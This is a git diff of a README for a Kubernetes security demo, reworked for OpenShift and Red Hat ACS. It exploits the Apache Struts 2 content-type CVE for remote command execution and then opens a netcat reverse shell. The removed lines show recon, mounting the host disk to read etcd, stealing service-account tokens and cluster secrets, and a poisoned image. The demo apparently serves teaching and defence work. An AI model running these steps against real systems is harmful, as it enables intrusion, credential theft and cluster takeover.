@@ -1,4 +1,4 @@
-# Kubernetes Container Hack
+# Demo of Kubernetes Container Hack in OpenShift, and protection via Red Hat ACS
 
 ## Exloiting a Vulnerability
 
@@ -8,50 +8,10 @@ Exploiting the Apache Struts 2 Java web framework CVE.
 
 Deploy Pod with vulnerable version:
 ```bash
-kubectl apply -f vulnerable-pod.yaml
+oc create -f vulnerable-pod.yaml
 ```
 
-Access web application at http://localhost:30004 or http://struts-showcase.apache.com:30004.
-
-### Setup Attacker Container
-
-Using Kali Linux which is the most popular Linux distrobution for hacking.
-```bash
-docker pull kalilinux/kali-rolling
-```
-
-Run container:
-```bash
-docker run --name kali --rm -it kalilinux/kali-rolling /bin/bash
-```
-
-Install required libraries:
-```bash
-apt-get update && apt-get install -y curl nmap nikto python3 nano dnsutils
-```
-
-### Attack Reconnaissance
-
-Scan network for open ports:
-```bash
-nmap -sT -p "80,135,443,445,30000-30100" host.docker.internal # this would be a CIDR range
-```
-
-Get the IP of the target:
-```bash
-nslookup host.docker.internal
-```
-
-Test for vulnerabilities and possible attacks using Nikto:
-```
-nikto -host 192.168.65.2:30004
-```
-
-Check attacker can access target:
-```bash
-# Replace the IP with the IP of your target container
-curl http://192.168.65.2:30004/index.action
-```
+Access web application at http://<openshiftappsip>:30004.
 
 ### Attack Target Container
 
@@ -59,13 +19,10 @@ We are now going to use the Apache Struts 2 CVE to exploit the container using *
 
 An invalid Content-Type header is passed into a request which throws an error. The error is not escaped properly which allows us to inject additional commands which will be performed on the target machine.
 
-![image](https://github.com/matt-bentley/KubernetesHackDemo/assets/27092434/c1833428-97a5-4143-ac24-81ce63cb7d11)
-
-
 Create Python script for strutshock attack:
 
 ```bash
-nano attack.py
+vi attack.py
 ```
 
 Copy following script:
@@ -121,37 +78,19 @@ if __name__ == '__main__':
 Execute command on target - Remote Command Execution (RCE):
 
 ```bash
-python3 attack.py http://192.168.65.2:30004/ "whoami"
-python3 attack.py http://192.168.65.2:30004/ "curl www.google.com"
+python3 attack.py http://<openshiftappsip>:30004/ "whoami"
 ```
 
 ### Gain Reverse Shell Access
 
 At this stage we can execute commands on the target machine. We want to go a step further by gaining a reverse shell into the container.
 
-#### Create Command and Control Server
+### Prepare to receive reverse shell
 
-A Command and Control container will be created to gain shell access and execute commands on the target. This could be used in the future to manage the attack across other machines.
-
-Run container:
-```bash
-docker run --name commandcontrol --rm -it -p 443:443 ubuntu /bin/bash
-```
-
-Install required libraries:
-```bash
-apt-get update && apt-get install -y ncat
-```
-
-Get IP of Apache container:
-```bash
-docker container inspect -f '{{ .NetworkSettings.IPAddress }}' commandcontrol
-```
-
-This IP will be used to establish command and control from the target in the next step. Firt we need to listen on the command and control server for a connection using netcat. We'll use port 443 because it is likely that it will be allowed outbound from the target already:
+Firt we need to listen on the command and control server for a connection using netcat. 
 
 ```bash
-nc -lnvp 443
+nc -lnvp 4444
 ```
 
 #### Get Reverse Shell on Target
@@ -161,21 +100,21 @@ From running a few commands we can see that the target vulnerable application is
 By running the following command we can see that it is running an old version of Debian Jessie:
 
 ```bash
-python3 attack.py http://192.168.65.2:30004/ "apt-get update"
+python3 attack.py http://<openshiftappsip>:30004/ "apt-get update"
 ```
 
 We can update the package manager sources so we can install additional libraries to exploit the target. We will install net can which will create a connection out to our command and control server.
 
 ```bash
-python3 attack.py http://192.168.65.2:30004/ "sed -i \'s/deb.debian.org/archive.debian.org/g\' /etc/apt/sources.list"
-python3 attack.py http://192.168.65.2:30004/ "apt-get update"
-python3 attack.py http://192.168.65.2:30004/ "apt-get install -y --force-yes netcat"
+python3 attack.py http://<openshiftappsip>:30004/ "sed -i \'s/deb.debian.org/archive.debian.org/g\' /etc/apt/sources.list"
+python3 attack.py http://<openshiftappsip>:30004/ "apt-get update"
+python3 attack.py http://<openshiftappsip>:30004/ "apt-get install -y --force-yes netcat"
 ```
 
 Now that netcat is installed we can establish an outbound connection from our target to our command and control server. Since we are using port 443 it is likely that this traffic would be allowed outbound by the target's network:
 
 ```bash
-python3 attack.py http://192.168.65.2:30004/ "bash -i >& /dev/tcp/192.168.65.2/443 0>&1"
+python3 attack.py http://<openshiftappsip>:30004/ "bash -i >& /dev/tcp/<localip>/4444 0>&1"
 ```
 
 We now have a reverse shell into the target.
@@ -213,104 +152,3 @@ sed -i 's/Welcome!/You have been Hacked!/g' showcase.jsp
 cat showcase.jsp
 ```
 
-#### Bind to Host
-
-If the pod is a privileged pod then it is possible to bind to the host's file system.
-
-```bash
-fdisk -l
-mkdir /host
-mount /dev/sda1 /host/
-cd /host
-cat etcd/member/snap/db
-```
-
-If the pod is on a master node then you will be able to see anything in etcd.
-
-#### Kubectl
-
-```bash
-curl -LO -k "https://dl.k8s.io/release/$(curl -L -k -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
-chmod +x kubectl
-./kubectl
-alias kubectl="./kubectl"
-kubectl auth can-i --list
-kubectl get secrets
-kubectl get secret connectionstrings -o yaml
-```
-
-Trying using an existing service account.
-
-If there is a service account secret available then it can also be used:
-
-```bash
-kubectl get secret admin-service-account-token -o yaml
-export TOKEN=$(kubectl get secret admin-service-account-token -o yaml -ojsonpath='{.data.token}' | base64 -d)
-alias kubectl="./kubectl --token=${TOKEN}"
-```
-
-At this point we have control of the whole cluster.
-
-```bash
-kubectl get pods -A
-kubectl run nginx --image nginx
-kubectl delete pod nginx
-```
-
-## Creating a Poisoned Image
-
-Build Image:
-
-```bash
-docker build -t myapp .
-```
-
-Run Website:
-
-```bash
-kubectl apply -f poisoned-pod.yaml
-```
-
-Build Poisoned Image:
-
-```bash
-docker build -t myapp -f Dockerfile.poisoned .
-```
-
-Force Pull Poisoned Image:
-```bash
-kubectl rollout restart deploy myapp
-```
-
-### Sniff Traffic from Command and Control Server
-
-Install **tcpdump** on the target:
-
-```bash
-apt-get update
-apt-get install -y tcpdump
-```
-
-Sniff traffic from web server:
-
-```bash
-tcpdump -i eth0 -nn -s0 -v port 80
-```
-
-## Detecting Application Vulnerabilities
-
-```bash
-snyk container test --app-vulns piesecurity/apache-struts2-cve-2017-5638:latest
-```
-
-## Protecting Against Attacks
-
-![image](https://github.com/matt-bentley/KubernetesHackDemo/assets/27092434/b1c8d1ba-6a84-4b78-afe3-54efb732e61d)
-
-1. Image/code vulnerability scanning
-2. DON’T RUN CONTAINERS AS ROOT USER! Use a Policy Agent to stop insecure configurations being deployed e.g. Containers running as Root
-3. Use a Web Application Firewall
-4. Kubernetes Network Policies (Layer 3 and 4)
-5. Service Mesh with Layer 7 rules
-6. Runtime security monitoring
-7. Use Principle of Least Privilege
